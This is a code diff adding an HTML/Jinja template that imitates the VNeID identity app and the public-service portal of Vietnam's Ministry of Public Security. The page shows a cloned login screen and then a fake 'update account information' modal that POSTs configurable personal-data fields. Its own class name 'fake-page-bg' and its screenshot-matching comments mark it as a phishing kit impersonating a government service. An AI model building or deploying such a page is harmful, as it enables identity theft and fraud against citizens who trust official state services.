@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>{{ data.form_title }}</title>
+    <style>
+        /* Đặt nền trình duyệt màu xám để nổi bật khung app ở giữa */
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            background-color: #e9ecef;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        /* Khung giới hạn tỷ lệ màn hình điện thoại */
+        .app-wrapper {
+            width: 100%;
+            max-width: 414px; /* Chuẩn kích thước màn hình điện thoại (VD: iPhone Max) */
+            min-height: 100vh;
+            background-color: #fff;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.15);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* =========================================
+           1. MÀN HÌNH CHÀO MỪNG (WELCOME SCREEN)
+           ========================================= */
+        #welcome-screen {
+            flex-grow: 1;
+            background: #8b0000;
+            background: radial-gradient(circle at 50% 30%, #a80b0b 0%, #6b0000 70%, #4a0000 100%);
+            display: flex;
+            flex-direction: column;
+            padding: 20px 24px;
+            box-sizing: border-box;
+        }
+
+        .welcome-top-bar { display: flex; justify-content: flex-end; margin-top: 10px; }
+        .welcome-lang-group { display: flex; align-items: center; gap: 4px; }
+        .welcome-flag { 
+            width: 24px; height: 24px; background: #da251d; border-radius: 50%; 
+            display: flex; justify-content: center; align-items: center; 
+            color: #ffeb3b; font-size: 14px; border: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .welcome-center-box { display: flex; flex-direction: column; align-items: center; margin-top: 50px; }
+        
+        /* Logo VNeID chuẩn xác hơn */
+        .welcome-logo-wrapper { width: 130px; height: 130px; margin-bottom: 25px; position: relative; }
+        .welcome-title-1 { color: #ffeb3b; font-size: 22px; font-weight: 800; text-align: center; margin-bottom: 5px; text-shadow: 1px 1px 3px rgba(0,0,0,0.5); }
+        .welcome-title-2 { color: #ffeb3b; font-size: 15px; font-weight: 600; text-align: center; text-shadow: 1px 1px 3px rgba(0,0,0,0.5); margin-bottom: 40px;}
+
+        .welcome-spacer { flex-grow: 1; }
+
+        .welcome-desc { color: #fff; font-size: 12px; text-align: center; line-height: 1.5; margin-bottom: 30px; opacity: 0.9; }
+
+        .btn-welcome-login {
+            background-color: #da251d; color: #fff; border: none; border-radius: 8px;
+            height: 48px; font-size: 15px; font-weight: 700; cursor: pointer; width: 100%; margin-bottom: 12px;
+        }
+        .btn-welcome-register {
+            background-color: transparent; color: #fff; border: 1px solid rgba(255,255,255,0.6); border-radius: 8px;
+            height: 48px; font-size: 15px; font-weight: 700; cursor: pointer; width: 100%; margin-bottom: 20px;
+        }
+
+        .welcome-links { text-align: center; font-size: 12px; color: rgba(255,255,255,0.8); margin-bottom: 25px; line-height: 1.8; }
+        .welcome-links span.highlight { color: #ff5252; font-weight: bold; }
+        .welcome-footer { display: flex; justify-content: space-between; font-size: 11px; color: rgba(255,255,255,0.6); margin-bottom: 10px; }
+        
+        
+        /* =========================================
+           2. MÀN HÌNH ĐĂNG NHẬP (TRẮNG)
+           ========================================= */
+        #login-screen {
+            display: none;
+            flex-grow: 1;
+            background-color: #fff;
+            flex-direction: column;
+            padding: 20px 24px;
+            box-sizing: border-box;
+        }
+
+        .login-top-bar { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; margin-bottom: 30px; }
+        .login-back-btn { color: #333; cursor: pointer; display: flex; }
+        .login-lang-group { display: flex; align-items: center; gap: 4px; }
+        .login-flag { width: 24px; height: 24px; background: #da251d; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: #ffeb3b; font-size: 14px; }
+        
+        .login-title { font-size: 20px; font-weight: 700; color: #222; margin-bottom: 30px; line-height: 1.4; }
+        
+        /* Căn chỉnh Input 100% giống ảnh */
+        .input-cccd-container { 
+            border: 1.5px solid #dfc36e; border-radius: 8px; padding: 0 15px; margin-bottom: 25px; 
+            display: flex; justify-content: space-between; align-items: center; height: 50px; 
+        }
+        .input-cccd-container input { border: none; outline: none; width: 100%; font-size: 16px; font-weight: 600; color: #333; }
+        
+        /* Biểu tượng khiên nhỏ trong ô CCCD */
+        .vneid-badge {
+            width: 32px; height: 32px; background: #da251d; border-radius: 50%;
+            border: 2px solid #2e7d32; display: flex; justify-content: center; align-items: center;
+            position: relative; box-sizing: border-box;
+        }
+        .vneid-badge::before { content: "★"; color: #ffeb3b; font-size: 16px; position: absolute; z-index: 2; }
+        .vneid-badge::after { content: ""; width: 20px; height: 20px; border: 1px solid #ffeb3b; border-radius: 50%; position: absolute; }
+
+        .password-label { font-size: 13px; color: #555; margin-bottom: 8px; }
+        .input-password-container { 
+            border: 1px solid #e0e0e0; border-radius: 8px; padding: 0 15px; margin-bottom: 25px; 
+            display: flex; align-items: center; height: 50px; 
+        }
+        .input-password-container input { border: none; outline: none; width: 100%; font-size: 15px; padding: 0 10px; color: #333; }
+        
+        .btn-login-main { background-color: #da251d; color: #fff; border: none; border-radius: 8px; height: 48px; font-size: 16px; font-weight: bold; cursor: pointer; text-align: center; margin-bottom: 20px; width: 100%; }
+        
+        .login-links { display: flex; justify-content: space-between; align-items: center; font-size: 13px; font-weight: 700; }
+        .link-forgot { color: #da251d; text-decoration: none; }
+        .link-switch { color: #444; display: flex; align-items: center; gap: 4px; text-decoration: none; }
+        
+        .face-id-login { display: flex; align-items: center; gap: 12px; margin-top: 35px; font-size: 14px; font-weight: bold; color: #333; cursor: pointer; }
+        .face-id-icon { display: flex; justify-content: center; align-items: center; width: 40px; height: 40px; border-radius: 50%; background: #fff0f0; color: #da251d; }
+        
+        .login-footer-spacer { flex-grow: 1; }
+        .login-footer-icons { display: flex; justify-content: space-around; margin-top: 40px; margin-bottom: 20px; }
+        .footer-icon-item { text-align: center; font-size: 12px; color: #555; display: flex; flex-direction: column; align-items: center; gap: 6px; }
+        
+        .login-bottom-text { text-align: center; font-size: 12px; color: #777; margin-bottom: 10px; }
+        .login-bottom-text a { color: #555; text-decoration: underline; margin-bottom: 8px; display: block; }
+
+        /* =========================================
+           3. MÀN HÌNH CHÍNH & MODAL (DVC)
+           ========================================= */
+        #main-app-screen { display: none; width: 100%; flex-grow: 1; background: #fff; flex-direction: column; }
+
+        .dvc-header { background-color: #fdf5d3; padding: 10px 15px; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #cc0000; }
+        .header-left { display: flex; align-items: center; }
+        .dvc-logo { width: 40px; height: 40px; background-color: #cc0000; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-right: 10px; border: 2px solid #cc0000; outline: 2px solid #ffcc00; outline-offset: -3px; }
+        .dvc-logo span { color: #ffcc00; font-size: 20px; line-height: 1; margin-top: 2px; }
+        .dvc-title { color: #cc0000; font-family: "Times New Roman", Times, serif; }
+        .dvc-title-top { font-size: 14px; font-weight: bold; }
+        .dvc-title-bottom { font-size: 16px; font-weight: bold; }
+        
+        .fake-page-bg { padding: 20px; background: #fff; flex-grow: 1;}
+        .fake-page-bg p { color: #666; font-size: 14px; margin-bottom: 15px; }
+        
+        .modal-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; padding: 15px; }
+        .container { background: #fff; width: 100%; border-radius: 6px; box-shadow: 0 5px 25px rgba(0,0,0,0.3); overflow: hidden; }
+        .form-header { padding: 12px 15px; border-bottom: 1px solid #e5e5e5; display: flex; justify-content: space-between; align-items: center; }
+        .form-header h2 { margin: 0; font-size: 14px; color: #333; font-weight: bold; }
+        .form-body { padding: 15px; }
+        .form-group { margin-bottom: 12px; }
+        .form-group label { display: block; font-size: 13px; color: #555; margin-bottom: 5px; }
+        .form-group label::after { content: " *"; color: #cc0000; }
+        .form-group input { width: 100%; box-sizing: border-box; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 13px; background-color: #f5f5f5; }
+        .form-footer { padding: 12px 15px; border-top: 1px solid #e5e5e5; background: #fff; display: flex; justify-content: center; gap: 10px; }
+        .btn-cancel { padding: 8px 25px; background: #fff; border: 1px solid #cc0000; color: #cc0000; border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: bold;}
+        .btn-submit { padding: 8px 25px; background-color: #cc0000; color: white; border: 1px solid #cc0000; border-radius: 4px; font-size: 13px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <!-- Khung bọc toàn bộ giao diện (Mô phỏng màn hình điện thoại) -->
+    <div class="app-wrapper">
+
+        <!-- =========================================
+             MÀN HÌNH 0: CHÀO MỪNG (VNeID ĐỎ)
+             ========================================= -->
+        <div id="welcome-screen">
+            <!-- Header (Cờ) -->
+            <div class="welcome-top-bar">
+                <div class="welcome-lang-group">
+                    <div class="welcome-flag">★</div>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.7)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+            </div>
+
+            <!-- Logo & Tiêu đề -->
+            <div class="welcome-center-box">
+                <div class="welcome-logo-wrapper">
+                    <!-- SVG Logo VNeID chuẩn -->
+                    <svg width="100%" height="100%" viewBox="0 0 100 100">
+                        <!-- Ngôi sao vàng lớn -->
+                        <polygon points="50,5 61,35 95,35 68,54 78,85 50,65 22,85 32,54 5,35 39,35" fill="#fdd835" />
+                        <!-- Vòng nguyệt quế và khiên (Mô phỏng) -->
+                        <circle cx="50" cy="48" r="18" fill="#d32f2f" stroke="#fdd835" stroke-width="2"/>
+                        <circle cx="50" cy="48" r="12" fill="none" stroke="#fdd835" stroke-width="1" stroke-dasharray="2,2"/>
+                        <text x="50" y="51" font-size="7" font-family="Arial" font-weight="bold" fill="white" text-anchor="middle">VNeID</text>
+                    </svg>
+                </div>
+                <div class="welcome-title-1">BỘ CÔNG AN</div>
+                <div class="welcome-title-2">Trung tâm dữ liệu Quốc gia về dân cư</div>
+            </div>
+
+            <div class="welcome-spacer"></div>
+
+            <!-- Nút & Footer -->
+            <div class="welcome-desc">
+                Ứng dụng định danh điện tử có giá trị sử dụng thay<br>
+                thế các giấy tờ truyền thống, định danh công dân trên<br>
+                môi trường kỹ thuật số, cung cấp các tiện ích phát<br>
+                triển công dân số, chính phủ số, xã hội số
+            </div>
+
+            <button type="button" class="btn-welcome-login" onclick="showLoginScreen()">Đăng nhập</button>
+            <button type="button" class="btn-welcome-register">Kích hoạt tài khoản định danh điện tử</button>
+
+            <div class="welcome-links">
+                <div>Bạn chưa có tài khoản? <span class="highlight">Đăng ký</span></div>
+                <div>Hotline hỗ trợ: <span class="highlight">1900.0368</span></div>
+            </div>
+
+            <div class="welcome-footer">
+                <div>Chính sách quyền riêng tư</div>
+                <div>Phiên bản 2.2.12</div>
+            </div>
+        </div>
+
+
+        <!-- =========================================
+             MÀN HÌNH 1: ĐĂNG NHẬP (TRẮNG) 
+             ========================================= -->
+        <div id="login-screen">
+            <div class="login-top-bar">
+                <div class="login-back-btn" onclick="showWelcomeScreen()">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
+                </div>
+                <div class="login-lang-group">
+                    <div class="login-flag">★</div>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"></polyline></svg>
+                </div>
+            </div>
+
+            <div class="login-title">Vui lòng nhập thông tin đăng nhập để<br>tiếp tục</div>
+
+            <div class="input-cccd-container">
+                <input type="text" id="login_username" value="">
+                <div class="vneid-badge"></div>
+            </div>
+
+            <div class="password-label">Mật khẩu</div>
+            <div class="input-password-container">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right: 8px;"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                <input type="password" placeholder="Nhập mật khẩu" id="login_password">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#999" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>
+            </div>
+
+            <!-- Nút Đăng nhập -> Chuyển sang form DVC -->
+            <button type="button" class="btn-login-main" onclick="processLogin()">Đăng nhập</button>
+
+            <div class="login-links">
+                <a href="#" class="link-forgot">Quên mật khẩu</a>
+                <a href="#" class="link-switch">
+                    Đổi tài khoản 
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#da251d" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"></polyline><polyline points="1 20 1 14 7 14"></polyline><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path></svg>
+                </a>
+            </div>
+
+            <div class="face-id-login">
+                <div class="face-id-icon">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#da251d" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"></path><path d="M9 10h.01M15 10h.01M9 16c1.5-1 4.5-1 6 0"></path><path d="M12 10v4"></path></svg>
+                </div>
+                <span>Đăng nhập bằng Face ID</span>
+            </div>
+
+            <div class="login-footer-spacer"></div>
+
+            <div class="login-footer-icons">
+                <div class="footer-icon-item">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke="#555" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path></svg>
+                    <span>Hướng dẫn<br>sử dụng</span>
+                </div>
+                <div class="footer-icon-item">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke="#555" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
+                    <span>Câu hỏi<br>thường gặp</span>
+                </div>
+                <div class="footer-icon-item">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke-width="1.5" stroke="#555" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                    <span>Hotline<br>hỗ trợ</span>
+                </div>
+            </div>
+
+            <div class="login-bottom-text">
+                <a href="#">Chính sách quyền riêng tư</a>
+                <div>Phiên bản 2.2.12</div>
+            </div>
+        </div>
+
+
+        <!-- =========================================
+             MÀN HÌNH 2: MODAL CẬP NHẬT THÔNG TIN
+             ========================================= -->
+        <div id="main-app-screen">
+            <div class="dvc-header">
+                <div class="header-left">
+                    <div class="dvc-logo"><span>★</span></div>
+                    <div class="dvc-title">
+                        <div class="dvc-title-top">CỔNG DỊCH VỤ CÔNG</div>
+                        <div class="dvc-title-bottom">BỘ CÔNG AN</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="fake-page-bg">
+                <p>Đang tải dữ liệu dân cư...</p>
+            </div>
+
+            <div class="modal-overlay">
+                <div class="container">
+                    <div class="form-header">
+                        <h2>Cập nhật thông tin tài khoản</h2>
+                        <span style="color:#aaa; cursor:pointer; font-size:18px;">×</span>
+                    </div>
+                    <form method="POST" onsubmit="return validateForm()">
+                        <div class="form-body">
+                            {% for field in data.inputs %}
+                            <div class="form-group">
+                                <label>{{ field.name }}</label>
+                                <input type="{{ field.type }}" name="field_{{ loop.index0 }}" id="field_{{ loop.index0 }}" required placeholder="Nhập {{ field.name|lower }}">
+                                <input type="hidden" id="pattern_{{ loop.index0 }}" value="{{ field.pattern }}">
+                                <input type="hidden" id="msg_{{ loop.index0 }}" value="{{ field.msg }}">
+                            </div>
+                            {% endfor %}
+                        </div>
+                        <div class="form-footer">
+                            <button type="button" class="btn-cancel">Hủy</button>
+                            <button type="submit" class="btn-submit">Cập nhật</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+
+    </div> <!-- Đóng .app-wrapper -->
+
+    <script>
+        // Chuyển từ Màn hình Đỏ -> Màn hình Trắng
+        function showLoginScreen() {
+            document.getElementById('welcome-screen').style.display = 'none';
+            document.getElementById('login-screen').style.display = 'flex';
+        }
+
+        // Quay lại màn hình Đỏ
+        function showWelcomeScreen() {
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('welcome-screen').style.display = 'flex';
+        }
+
+        // Chuyển từ Màn hình Trắng -> Màn hình DVC
+        function processLogin() {
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('main-app-screen').style.display = 'flex';
+        }
+
+        // Validate form với JS thuần để không báo lỗi linter
+        function validateForm() {
+            let i = 0;
+            while (true) {
+                let fieldInput = document.getElementById("field_" + i);
+                if (!fieldInput) break; 
+                let val = fieldInput.value;
+                let patternInput = document.getElementById("pattern_" + i);
+                let msgInput = document.getElementById("msg_" + i);
+                
+                if (patternInput && patternInput.value) {
+                    let pattern = new RegExp(patternInput.value);
+                    if (!pattern.test(val)) {
+                        alert(msgInput.value);
+                        return false; 
+                    }
+                }
+                i++;
+            }
+            return true;
+        }
+    </script>
+</body>
+</html>
